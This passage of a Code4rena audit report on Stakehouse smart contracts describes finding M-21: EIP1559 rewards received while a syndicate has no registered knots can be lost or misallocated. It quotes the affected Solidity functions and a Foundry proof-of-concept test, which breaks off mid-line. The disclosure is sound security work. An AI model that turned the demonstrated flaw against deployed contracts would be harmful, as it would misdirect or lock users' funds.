focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/376\">[M-21] EIP1559 rewards received by syndicate during the period when it has no registered knots can be lost</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/376\">rbserver</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L218-L220\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L218-L220</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L154-L157\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L154-L157</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L597-L607\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L597-L607</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L610-L627\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L610-L627</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L174-L197\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L174-L197</a></p>\n<p>When the <code>deRegisterKnotFromSyndicate</code> function is called by the DAO, the <code>_deRegisterKnot</code> function is eventually called to execute <code>numberOfRegisteredKnots -= 1</code>. It is possible that <code>numberOfRegisteredKnots</code> is reduced to 0. During the period when the syndicate has no registered knots, the EIP1559 rewards that are received by the syndicate remain in the syndicate since functions like <code>updateAccruedETHPerShares</code> do not include any logics for handling such rewards received by the syndicate. Later, when a new knot is registered and mints the derivatives, the node runner can call the <code>claimRewardsAsNodeRunner</code> function to receive half ot these rewards received by the syndicate during the period when it has no registered knots. Yet, because such rewards are received by the syndicate before the new knot mints the derivatives, the node runner should not be entitled to these rewards. Moreover, due to the issue mentioned in my other finding titled “Staking Funds vault’s LP holder cannot claim EIP1559 rewards after derivatives are minted for a new BLS public key that is not the first BLS public key registered for syndicate”, calling the <code>StakingFundsVault.claimRewards</code> function by the Staking Funds vault’s LP holder reverts so the other half of such rewards is locked in the syndicate. Even if calling the <code>StakingFundsVault.claimRewards</code> function by the Staking Funds vault’s LP holder does not revert, the Staking Funds vault’s LP holder does not deserve the other half of such rewards because these rewards are received by the syndicate before the new knot mints the derivatives. Because these EIP1559 rewards received by the syndicate during the period when it has no registered knots can be unfairly sent to the node runner or remain locked in the syndicate, such rewards are lost.</p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L218-L220\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L218-L220</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"116\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deRegisterKnotFromSyndicate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blsPublicKeys</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyDAO</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">Syndicate</span><span class=\"mtk1\">(</span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">syndicate</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">deRegisterKnots</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_blsPublicKeys</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L154-L157\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L154-L157</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"117\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deRegisterKnots</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blsPublicKeys</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">updateAccruedETHPerShares</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_deRegisterKnots</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_blsPublicKeys</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L597-L607\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L597-L607</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"118\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_deRegisterKnots</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blsPublicKeys</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_blsPublicKeys</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">blsPublicKey</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_blsPublicKeys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Do one final snapshot of ETH owed to the collateralized SLOT owners so they can claim later</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_updateCollateralizedSlotOwnersLiabilitySnapshot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPublicKey</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Execute the business logic for de-registering the single knot</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_deRegisterKnot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPublicKey</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L610-L627\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L610-L627</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"119\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_deRegisterKnot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blsPublicKey</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">isKnotRegistered</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_blsPublicKey</span><span class=\"mtk1\">] == </span><span class=\"mtk4\">false</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">KnotIsNotRegisteredWithSyndicate</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">isNoLongerPartOfSyndicate</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_blsPublicKey</span><span class=\"mtk1\">] == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">KnotHasAlreadyBeenDeRegistered</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// We flag that the knot is no longer part of the syndicate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">isNoLongerPartOfSyndicate</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_blsPublicKey</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// For the free floating and collateralized SLOT of the knot, snapshot the accumulated ETH per share</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">lastAccumulatedETHPerFreeFloatingShare</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_blsPublicKey</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">accumulatedETHPerFreeFloatingShare</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// We need to reduce `totalFreeFloatingShares` in order to avoid further ETH accruing to shares of de-registered knot</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">totalFreeFloatingShares</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">sETHTotalStakeForKnot</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_blsPublicKey</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Total number of registered knots with the syndicate reduces by one</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">numberOfRegisteredKnots</span><span class=\"mtk1\"> -= </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">KnotDeRegistered</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_blsPublicKey</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L174-L197\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L174-L197</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"120\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateAccruedETHPerShares</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">numberOfRegisteredKnots</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// todo - check else case for any ETH lost</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-36\" style=\"position:relative;\"><a href=\"#proof-of-concept-36\" aria-label=\"proof of concept 36 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Please add the following code in <code>test\\foundry\\LiquidStakingManager.t.sol</code>.</p>\n<ol>\n<li>Import <code>stdError</code> as follows.</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"121\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">stdError</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;forge-std/Test.sol&quot;</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<ol start=\"2\">\n<li>Add the following test. This test will pass to demonstrate the described scenario.</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"122\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testEIP1559RewardsReceivedBySyndicateDuringPeriodWhenItHasNoRegisteredKnotsCanBeLost</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// set up users and ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accountOne</span><span class=\"mtk1\">; </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">, </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feesAndMevUser</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accountTwo</span><span class=\"mtk1\">; </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">feesAndMevUser</span><span class=\"mtk1\">, </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">savETHUser</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accountThree</span><span class=\"mtk1\">; </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">savETHUser</span><span class=\"mtk1\">, </span><span class=\"mtk7\">24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// do everything from funding a validator within default LSDN to minting derivatives</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">depositStakeAndMintDerivativesForDefaultNetwork</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">feesAndMevUser</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">savETHUser</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">blsPubKeyFour</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// send the syndicate some EIP1559 rewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">eip1559Tips</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0.6743</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, ) = </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">syndicate</span><span class=\"mtk1\">().</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">eip1559Tips</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">success</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// de-register the only knot from the syndicate to send sETH back to the smart wallet</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sETH</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">MockSlotRegistry</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">slot</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">stakeHouseShareTokens</span><span class=\"mtk1\">(</span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stakehouse</span><span class=\"mtk1\">()));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sETHBalanceBefore</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">sETH</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">smartWalletOfNodeRunner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">admin</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deRegisterKnotFromSyndicate</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getBytesArrayFromBytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyFour</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">restoreFreeFloatingSharesToSmartWalletForRageQuit</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">smartWalletOfNodeRunner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">getBytesArrayFromBytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyFour</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">getUint256ArrayFromValues</span><span class=\"mtk1\">(</span><span class=\"mtk7\">12</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">sETH</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">smartWalletOfNodeRunner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">)) - </span><span class=\"mtk12\">sETHBalanceBefore</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">12</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">3</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hours</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// feesAndMevUser, who is the Staking Funds vault&#39;s LP holder, can claim rewards accrued up to the point of pulling the plug</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">feesAndMevUser</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">stakingFundsVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimRewards</span><span class=\"mtk1\">(</span><span class=\"mtk12\">feesAndMevUser</span><span class=\"mtk1\">, </span><span class=\"mtk11\">getBytesArrayFromBytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyFour</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feesAndMevUserEthBalanceBefore</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">feesAndMevUser</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 